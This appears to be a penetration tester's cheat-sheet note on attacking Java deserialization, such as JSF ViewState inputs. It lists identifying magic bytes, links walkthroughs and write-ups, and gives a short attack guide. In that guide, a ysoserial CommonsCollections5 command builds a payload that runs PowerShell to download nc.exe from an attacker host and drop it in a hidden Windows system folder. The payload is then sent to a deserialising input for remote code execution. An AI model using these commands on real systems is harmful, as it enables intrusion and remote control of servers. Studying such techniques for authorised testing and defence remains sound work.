
Decompiler: `jd-gui`

# Serialised Java Data

Magic Bytes: `AC ED`
Common extensions: `javax.faces.ViewState`
Common URI file name: `.faces`
## Walkthrough

1. [Exploiting blind Java deserialization with Burp and Ysoserial – n00py Blog](https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/)
2. [Tricking blind Java deserialization for a treat – Security Café](https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/)
3. [Hack The Box - Arkham - 0xRick’s Blog](https://0xrick.github.io/hack-the-box/arkham/#jsf-viewstate-deserialization-vulnerability) Encrypted usage

## Interesting links

- [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
- [Exploiting blind Java deserialization with Burp and Ysoserial](https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/)
- [How i found a 1500$ worth Deserialization vulnerability](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
- [Encrypted Java Serialized RCE](https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d)
## Guide

### Deserialization Attack

YSOSerial.jar:
`wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar`

This tool requires an important piece of information: a payload. See the walkthroughs above as the most time it will be blind. Hopefully in enumeration and recon a file or maybe Java Class.

````
java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri "http://10.10.xx.xx/nc.exe" -OutFile "C:\windows\system32\spool\drivers\color\nc.exe"' > uploadnc.payload
````

Send the payload to the input which desterilises to execute. 

## Execute System Commands in Java

[Java Runtime.getRuntime(): getting output from executing a command line program - Stack Overflow](https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program/20624914#20624914)